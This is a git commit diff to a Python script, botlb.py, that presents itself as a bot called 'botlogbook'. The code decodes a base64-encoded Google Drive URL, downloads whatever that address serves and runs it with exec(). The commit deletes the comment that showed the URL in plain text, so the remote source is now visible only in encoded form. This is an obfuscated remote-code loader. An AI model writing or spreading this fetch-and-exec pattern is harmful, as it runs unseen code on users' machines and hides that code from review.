14e91f5dd3cf9d67ced7c88229f9d4424ac2f2e5
8manhere <bagoesnoegroho73@gmail.com>
2025-07-07 11:47:45 +0800

    Update botlb.py

--- botlb.py
+++ botlb.py
@@ -17,20 +17,13 @@ def move_console():
     except Exception as e:
         print(f"Gagal memindahkan window: {e}")
         
-# Pindahkan konsol
 move_console()
 
-# server bot
 url = base64.b64decode("aHR0cHM6Ly9kcml2ZS51c2VyY29udGVudC5nb29nbGUuY29tL2Rvd25sb2FkP2lkPTE4VV9Xd2FNZjNBcExWOVR0NGNhdVNtVGFhbUhuVmtXYyZleHBvcnQ9ZG93bmxvYWQmY29uZmlybT10AA==").decode()
-
-# https://drive.usercontent.google.com/download?id=18U_WwaMf3ApLV9Tt4cauSmTaamHnVkWc&export=download&confirm=t
-
-# Meminta server merespon
 response = requests.get(url)
 
-# Cek status server
 if response.status_code == 200:
     print("Welcome to botlogbook.", end="\r")
-    exec(response.text)  # Menjalankan bot
+    exec(response.text)
 else:
     print(f"Server gagal merespon. Status: {response.status_code}")
